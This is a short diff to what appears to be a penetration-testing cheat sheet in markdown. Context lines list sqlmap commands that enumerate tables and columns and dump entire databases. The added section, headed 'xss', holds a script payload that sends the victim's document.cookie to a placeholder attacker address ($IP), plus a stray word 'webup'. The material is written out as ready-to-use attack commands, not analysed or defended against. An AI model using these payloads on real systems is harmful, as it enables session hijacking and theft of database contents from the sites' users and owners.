@@ -56,3 +56,10 @@ sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables
 sqlmap -r req.txt -D <database_name> -T <table_name> --columns
 sqlmap -r req.txt-p  -D <database_name> --dump-all
 ```
+
+#### xss
+```js
+webup
+<script>window.location='http://$IP:80/?cookie=' + document.cookie</script>
+```
+
